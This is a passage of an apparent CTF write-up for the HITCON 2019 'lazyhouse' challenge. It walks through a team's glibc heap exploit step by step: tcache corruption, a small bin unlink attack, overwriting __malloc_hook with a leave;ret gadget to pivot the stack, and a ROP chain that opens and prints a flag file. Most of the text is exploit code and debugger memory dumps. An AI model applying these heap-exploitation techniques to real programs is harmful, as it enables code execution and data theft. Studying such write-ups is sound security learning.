<span class="mh">0x562a666cd000</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000251</span>
<span class="mh">0x562a666cd010</span><span class="o">:</span> <span class="mh">0x0200000000000101</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x562a666cd020</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x562a666cd030</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x562a666cd040</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x562a666cd050</span><span class="o">:</span> <span class="mh">0x0000562a666cda40</span>      <span class="mh">0x0000562a666cd9b0</span> <span class="o">&lt;-</span> <span class="n">our</span> <span class="mh">0x20</span> <span class="n">and</span> <span class="mh">0x30</span> <span class="n">chunks</span>
<span class="mh">0x562a666cd060</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>    <span class="n">in</span> <span class="n">tcache_perthread_struct</span>
</code></pre></div></div>

<p>Next, what <strong>Balsn</strong> does is fill up the 0x210 tcache bin in order to be able to send a 0x210 sized chunk into a small bin (to be used for the small bin unlink attack).</p>

<p>While they do this, they also insert a fake chunk of size 0xd1. This fake chunk is exactly 0x6c1 bytes after that 0x6c1 fake chunk we inserted into index 5. This bypasses the check in <code class="highlighter-rouge">_int_free</code> when we free the 0x6c1 sized chunk, which makes sure that the next chunk‚Äôs <code class="highlighter-rouge">PREV_INUSE</code> bit is set.</p>

<p>Also while they do that, they prepare the 0x210 chunk that is going to be used in the small bin unlink attack such that it lies right on top of the pointer to that 0x21 sized fake chunk we freed earlier.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># We create a chunk to go right up to the 0x20 sized chunk's fd and bk
# We must also maintain the 0x6c1 sized fake chunk here as we still have a pointer to it
# We will free the fake 0x6c1 chunk into the unsorted bin later
# It will be used to overwrite the metadata of the fake chunks from above
</span><span class="n">buy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1a0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">15</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6c1</span><span class="p">))</span>

<span class="c1"># This chunk will be right on top of where the fake 0x20 sized chunk was before
# It will be sent into the small bin
# We will use it to perform a small bin unlink attack later
</span><span class="n">buy</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x210</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x210</span><span class="p">)</span>

<span class="c1"># Just a filler chunk for the next chunk
</span><span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x210</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x210</span><span class="p">)</span>
<span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># Send to tcache
</span>
<span class="c1"># We need the fake 0xd1 chunk header here to be able to free the 0x6c1 chunk
# This offset can be found using gdb
</span><span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x210</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x148</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xd1</span><span class="p">))</span>
<span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># Send to tcache
</span>
<span class="c1"># Fill the 0x210 tcache bin the rest of the way
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
  <span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x210</span><span class="p">,</span> <span class="s">'a'</span><span class="p">)</span>
  <span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></div></div>

<p>Following this, they allocate and free a 0x3a0 sized chunk. This increments the count field of the 0x3a0 tcache bin by one. This is done in order to make it look like there is a 0x100 sized chunk at <code class="highlighter-rouge">heapbase+0x40</code> which is important since they will later use the small bin unlink attack to get a chunk right on top of this address. One of the checks will make sure this chunk has a ‚Äúlegal size‚Äù, thus this must look like a fake chunk:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># We create a fake 0x100 chunk header in the tcache_perthread_struct
# by freeing this chunk
</span><span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x3a0</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x3a0</span><span class="p">)</span>
<span class="n">sell</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># Send to tcache
</span></code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span> <span class="mh">0x55f2db383000</span>
<span class="mh">0x55f2db383000</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000251</span>
<span class="mh">0x55f2db383010</span><span class="o">:</span> <span class="mh">0x0200000000000101</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x55f2db383020</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x55f2db383030</span><span class="o">:</span> <span class="mh">0x0000000000000007</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x55f2db383040</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000100</span> <span class="o">&lt;-</span> <span class="n">heapbase</span><span class="o">+</span><span class="mh">0x40</span>
<span class="mh">0x55f2db383050</span><span class="o">:</span> <span class="mh">0x000055f2db383a40</span>      <span class="mh">0x000055f2db3839b0</span>
<span class="mh">0x55f2db383060</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
</code></pre></div></div>

<p>Now we start with the small bin unlink attack. First, remember the 0x210 sized chunk we allocated that I said was right on top of that fake 0x20 sized chunk from way before? We now send it to the small bin:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Send that initial 0x210 sized chunk into the small bin now
</span><span class="n">sell</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># Send it to the unsorted bin
</span><span class="n">buy</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x220</span><span class="p">,</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x210</span><span class="p">)</span> <span class="c1"># Move it to the small bin 
</span></code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">smallbin</span>
<span class="n">smallbins</span>
<span class="mh">0x220</span><span class="o">:</span> <span class="mh">0x55be054fea40</span> <span class="err">‚Äî‚ñ∏</span> <span class="mh">0x7f9879311eb0</span> <span class="p">(</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">624</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x55be054fea40</span>
</code></pre></div></div>

<p>Now we free that fake 0x6c1 chunk from before into the unsorted bin, and reallocate it to be able to overwrite the metadata for the 0x20 and 0x30 sized fake chunks whose pointers are currently in the <code class="highlighter-rouge">tcache_perthread_struct</code>.</p>

<ul>
  <li>We make it so that the <code class="highlighter-rouge">fd</code> pointer of the 0x20 chunk points to the fake chunk in the <code class="highlighter-rouge">tcache_perthread_struct</code>.</li>
  <li>We make it so that the <code class="highlighter-rouge">fd</code> pointer for the small bin chunk (the 0x30 sized chunk essentially) points to the small bin itself (as it should), while the <code class="highlighter-rouge">bk</code> pointer points to the fake chunk in the <code class="highlighter-rouge">tcache_perthread_struct</code>.</li>
</ul>

<p>This is shown below:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">smallbin</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1e4eb0</span> <span class="c1"># 0x220 small bin is here
</span><span class="n">tcache_fake_chunk</span> <span class="o">=</span> <span class="n">heap</span><span class="o">+</span><span class="mh">0x40</span> <span class="c1"># Fake chunk in the tcache_perthread_struct
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x98</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span> <span class="c1"># 0x30 sized chunk pointer points here
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">tcache_fake_chunk</span><span class="p">)</span> <span class="c1"># Overwrite the fd to heapbase+0x40
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mh">0x80</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x221</span><span class="p">)</span> <span class="c1"># 0x30 sized chunk pointer points here
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">smallbin</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">tcache_fake_chunk</span><span class="p">)</span> <span class="c1"># Overwrite fd and bk, corrupt smallbin
</span><span class="n">buy</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x6b0</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<p>This sets it up so that the heap and the smallbin now looks like this:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">gx</span> <span class="mh">0x562f0aff6000</span>
<span class="mh">0x562f0aff6000</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000251</span>
<span class="mh">0x562f0aff6010</span><span class="o">:</span> <span class="mh">0x0200000000000101</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x562f0aff6020</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x562f0aff6030</span><span class="o">:</span> <span class="mh">0x0000000000000007</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x562f0aff6040</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000100</span> <span class="o">&lt;-</span> <span class="n">fake_chunk</span> <span class="n">in</span> <span class="n">the</span>
<span class="mh">0x562f0aff6050</span><span class="o">:</span> <span class="mh">0x0000562f0aff6a40</span>      <span class="mh">0x0000562f0aff69b0</span>    <span class="n">tcache_perthread_struct</span>
<span class="mh">0x562f0aff6060</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>

<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">gx</span> <span class="mh">0x0000562f0aff6a40</span> <span class="o">&lt;-</span> <span class="p">(</span><span class="n">fake_chunk</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">)</span>
<span class="mh">0x562f0aff6a40</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000221</span> 
<span class="mh">0x562f0aff6a50</span><span class="o">:</span> <span class="mh">0x00007f42e405deb0</span>      <span class="mh">0x0000562f0aff6040</span> <span class="o">&lt;-</span> <span class="n">fake_chunk</span>   
                        <span class="o">^------------------------------------</span> <span class="n">small</span> <span class="n">bin</span>

<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">gx</span> <span class="mh">0x0000562f0aff69b0</span> <span class="o">&lt;-</span> <span class="p">(</span><span class="n">fake_chunk</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">)</span>
<span class="mh">0x562f0aff69b0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000031</span>
<span class="mh">0x562f0aff69c0</span><span class="o">:</span> <span class="mh">0x0000562f0aff6040</span>      <span class="mh">0x0000000000000000</span>
                        <span class="o">^------------------------------------</span> <span class="n">fake_chunk</span>

<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">4</span><span class="n">gx</span> <span class="mh">0x00007f42e405deb0</span> <span class="o">&lt;-</span> <span class="n">small</span> <span class="n">bin</span>
<span class="mh">0x7f42e405deb0</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">624</span><span class="o">&gt;:</span>        <span class="mh">0x00007f42e405dea0</span>      <span class="mh">0x00007f42e405dea0</span>
<span class="mh">0x7f42e405dec0</span> <span class="o">&lt;</span><span class="n">main_arena</span><span class="o">+</span><span class="mi">640</span><span class="o">&gt;:</span>        <span class="mh">0x0000562f0aff6a40</span>      <span class="mh">0x0000562f0aff6a40</span>
</code></pre></div></div>

<p>With this setup, the first chunk we allocate out of this small bin will give us back the 0x210 sized chunk we freed initially into the small bin. The next chunk we allocate will be right on top of <code class="highlighter-rouge">heapbase+0x40</code>.</p>

<p>The setup is so extensive just to bypass the following check in <code class="highlighter-rouge">__int_malloc</code>:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">nb</span><span class="p">))</span>
  <span class="p">{</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="n">smallbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
    <span class="n">bin</span> <span class="o">=</span> <span class="n">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">last</span> <span class="p">(</span><span class="n">bin</span><span class="p">))</span> <span class="o">!=</span> <span class="n">bin</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"malloc(): smallbin double linked list corrupted"</span><span class="p">);</span>
      <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
      <span class="n">bin</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
      <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bin</span><span class="p">;</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span>
        <span class="n">set_non_main_arena</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
      <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
      <span class="p">...</span>
      <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
      <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
</code></pre></div></div>

<p>Essentially, the only check we have to bypass is the <code class="highlighter-rouge">if (__glibc_unlikely (bck-&gt;fd) != victim)</code> check. You should be able to verify yourself from the memory shown above that the chunks are set up correctly to be able to bypass it.</p>

<p>After that check is bypassed, the small bin‚Äôs <code class="highlighter-rouge">bk</code> is set to the <code class="highlighter-rouge">bk</code> field of the <code class="highlighter-rouge">victim</code> chunk. In our case, this gets it set to <code class="highlighter-rouge">heapbase+0x40</code>. It also sets the <code class="highlighter-rouge">fd</code> pointer of the fake chunk at <code class="highlighter-rouge">heapbase+0x40</code> to point to the small bin. This makes it so that the next allocation will give us a chunk right on top of <code class="highlighter-rouge">heapbase+0x40</code>.</p>

<p><strong>Balsn</strong> uses the first chunk allocation out of the small bin to set up their ROP chain on the heap. I‚Äôve replaced ‚Äò/home/lazyhouse/flag‚Äô with ‚Äò/home/vagrant/flag‚Äô due to using the exploit on my own machine:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Put the flag's location string at a known place on the heap
# Using gdb, the flag's location string will be at heapbase+0xa68
</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'Z'</span><span class="o">*</span><span class="mh">0x18</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">'/home/vagrant/flag'</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>

<span class="c1"># ROP to open the flag file
# Flag file's file descriptor will be 3
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mh">0xa68</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>

<span class="c1"># ROP to read the flag file's contents right into heapbase
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>

<span class="c1"># ROP to write the contents of heapbase right into stdout
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>

<span class="c1"># ROP chain will start at heapbase+0xa88
</span><span class="n">buy</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x210</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<p>Now that the ROP chain is on the heap at a known address, the next allocation will give us a chunk right on top of <code class="highlighter-rouge">heapbase+0x40</code>. We will use this chunk to overwrite the 0x210 tcache bin pointer to point to <code class="highlighter-rouge">__malloc_hook</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; smallbin
smallbins
0x220 [corrupted]
FD: 0x55d424dd7a40 ‚óÇ‚Äî 'ZZZZZZZZZZZZZZZZZZZZZZZZ/home/vagrant/flag'
BK: 0x55d424dd7040 ‚Äî‚ñ∏ 0x55d424dd79b0 ‚óÇ‚Äî 0x0 // We are given whatever bk points to
</code></pre></div></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Overwrite the 0x210 sized chunk tcache bin with pointer to __malloc_hook
</span><span class="n">buy</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x210</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
</code></pre></div></div>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">tcachebin</span>
<span class="n">tcachebins</span>
<span class="mh">0x20</span> <span class="p">[</span>  <span class="mi">1</span><span class="p">]</span><span class="o">:</span> <span class="mh">0x0</span>
<span class="mh">0x30</span> <span class="p">[</span>  <span class="mi">1</span><span class="p">]</span><span class="o">:</span> <span class="mh">0x0</span>
<span class="mh">0x90</span> <span class="p">[</span>  <span class="mi">2</span><span class="p">]</span><span class="o">:</span> <span class="mh">0x0</span>
<span class="mh">0x220</span> <span class="p">[</span>  <span class="mi">7</span><span class="p">]</span><span class="o">:</span> <span class="mh">0x7f8caef98c30</span> <span class="p">(</span><span class="n">__malloc_hook</span><span class="p">)</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x0</span>
<span class="mh">0x3b0</span> <span class="p">[</span>  <span class="mi">1</span><span class="p">]</span><span class="o">:</span> <span class="mh">0x5647d9022b50</span> <span class="err">‚óÇ‚Äî</span> <span class="mh">0x0</span>
</code></pre></div></div>

<p>Now, since the <code class="highlighter-rouge">buy_super_house</code> function calls <code class="highlighter-rouge">malloc(0x217)</code>, if we try to buy a super house, it will actually give us a chunk on <code class="highlighter-rouge">__malloc_hook</code>.</p>

<p>We can‚Äôt overwrite <code class="highlighter-rouge">__malloc_hook</code> with a one gadget, since the <code class="highlighter-rouge">execve</code> syscall is not whitelisted by <strong>seccomp</strong>. The way <strong>Balsn</strong> bypasses this is just absolutely amazing. They overwrite <code class="highlighter-rouge">__malloc_hook</code> with a <code class="highlighter-rouge">leave; ret</code> gadget. Why they do it is explained below, but first, in order to overwrite <code class="highlighter-rouge">__malloc_hook</code>, just do the following:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Overwrite __malloc_hook with a leave; ret gadget
</span><span class="n">super_house</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">))</span> <span class="c1"># __mpn_mul_n+83
</span></code></pre></div></div>

<p>Now why does this work?</p>

<p>In order to understand it, we actually have to look at the disassembly for <code class="highlighter-rouge">__libc_calloc</code>. When <code class="highlighter-rouge">__libc_calloc</code> is called, assuming that <code class="highlighter-rouge">__malloc_hook</code> is not <code class="highlighter-rouge">NULL</code>, the following control flow is observed:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mov</span>     <span class="n">rdx</span><span class="p">,</span> <span class="n">rdi</span>
<span class="n">push</span>    <span class="n">r14</span>
<span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="n">FFFFFFFFh</span>
<span class="n">push</span>    <span class="n">r13</span>
<span class="n">or</span>      <span class="n">rdx</span><span class="p">,</span> <span class="n">rsi</span>
<span class="n">push</span>    <span class="n">r12</span>
<span class="n">push</span>    <span class="n">rbp</span>
<span class="n">mov</span>     <span class="n">rbp</span><span class="p">,</span> <span class="n">rdi</span> <span class="c1">// [1]</span>
<span class="n">push</span>    <span class="n">rbx</span>
<span class="n">imul</span>    <span class="n">rbp</span><span class="p">,</span> <span class="n">rsi</span> <span class="c1">// [2]</span>
<span class="n">cmp</span>     <span class="n">rdx</span><span class="p">,</span> <span class="n">rax</span>
<span class="n">jbe</span>     <span class="kt">short</span> <span class="n">loc_99A28</span>

<span class="n">loc_99A28</span><span class="o">:</span>
<span class="n">mov</span>     <span class="n">rax</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">__malloc_hook</span>
<span class="n">mov</span>     <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="n">test</span>    <span class="n">rax</span><span class="p">,</span> <span class="n">rax</span>
<span class="n">jnz</span>     <span class="n">loc_99CD0</span>

<span class="n">loc_99CD0</span><span class="o">:</span>
<span class="n">mov</span>     <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">28</span><span class="n">h</span><span class="p">]</span>
<span class="n">mov</span>     <span class="n">rdi</span><span class="p">,</span> <span class="n">rbp</span>
<span class="n">call</span>    <span class="n">rax</span>
</code></pre></div></div>

<p>Note that in our case, <code class="highlighter-rouge">buy_house</code> will call <code class="highlighter-rouge">calloc(1, size)</code>, meaning <code class="highlighter-rouge">rdi</code> will be 1, and <code class="highlighter-rouge">rsi</code> will be whatever size we enter.</p>

<p>At <strong>[1]</strong>, we see a <code class="highlighter-rouge">mov rbp, rdi</code> instruction, which will set <code class="highlighter-rouge">rbp</code> to 1. At <strong>[2]</strong>, we see a <code class="highlighter-rouge">imul rbp, rsi</code> instruction, which will multiply <code class="highlighter-rouge">rbp</code>(1) by <code class="highlighter-rouge">rsi</code>(size that we control) and store the result into <code class="highlighter-rouge">rbp</code>. Later on, at the <code class="highlighter-rouge">call rax</code> instruction, <code class="highlighter-rouge">rbp</code> will still be equal to <code class="highlighter-rouge">size * 1</code>.</p>

<p>Now, remember that we overwrote <code class="highlighter-rouge">__malloc_hook</code> with the address to a <code class="highlighter-rouge">leave; ret</code> gadget. The <code class="highlighter-rouge">leave</code> instruction is equivalent to <code class="highlighter-rouge">mov rsp, rbp; pop rbp</code>. Remember that our ROP chain is at <code class="highlighter-rouge">heapbase+0xa88</code>. If we ensure that the size we pass to <code class="highlighter-rouge">calloc</code> is equal to <code class="highlighter-rouge">heapbase+0xa80</code>, what is going to happen is that <code class="highlighter-rouge">rsp</code> will be set to <code class="highlighter-rouge">heapbase+0xa80</code> when the <code class="highlighter-rouge">mov rsp, rbp</code> instruction happens, and then the <code class="highlighter-rouge">pop rbp</code> instruction will move <code class="highlighter-rouge">rsp</code> to <code class="highlighter-rouge">heapbase+0xa88</code>. The following <code class="highlighter-rouge">ret</code> instruction will return into whatever address is at <code class="highlighter-rouge">rsp</code>, which will be the address stored at <code class="highlighter-rouge">heapbase+0xa88</code>.</p>

<p>Since our ROP chain starts at <code class="highlighter-rouge">heapbase+0xa88</code>, we will have successfully pivoted the stack to <code class="highlighter-rouge">heapbase+0xa88</code> and returned into our ROP chain. It is absolutely mind blowing, I‚Äôve never seen anyone use this technique before, and it is amazing to see <strong>Balsn</strong> do this during the CTF.</p>

<p>After overwriting <code class="highlighter-rouge">__malloc_hook</code> with a <code class="highlighter-rouge">leave; ret</code> gadget, simply attempt to buy a house with a size of <code class="highlighter-rouge">heapbase+0xa80</code> to pivot the stack and return into the ROP chain that has already been stored on the heap:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># rbp is set to rsi before __malloc_hook is called in calloc
# Therefore we pass heap+0xa80 as an argument, as our ROP chain starts at
# heap+0xa88
</span><span class="n">buy</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">heap</span><span class="o">+</span><span class="mh">0xa80</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>I created a fake flag by doing <code class="highlighter-rouge">echo -n hitconctf{congrats} &gt; /home/vagrant/flag</code> and ran the exploit:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu1904:/ctf/CTF-archive/hitcon-2019/lazyhouse<span class="nv">$ </span>./exploit.py 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/ctf/CTF-archive/hitcon-2019/lazyhouse/lazyhouse'</span>
